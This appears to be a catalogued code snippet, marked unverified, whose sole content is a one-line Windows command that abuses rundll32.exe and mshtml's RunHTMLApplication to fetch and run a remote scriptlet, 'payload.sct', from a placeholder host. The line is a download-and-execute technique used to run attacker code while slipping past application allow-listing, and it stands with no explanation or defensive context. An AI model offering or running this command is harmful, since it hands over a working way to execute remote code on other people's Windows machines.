---
id: 9ecaf399-a262-4aa9-8554-74f91906a835
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:26.894251+00:00'
updated_at: '2023-04-10T20:37:09.604784+00:00'
---

# Code Snippet 9ecaf399

**Language**: Powershell

```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
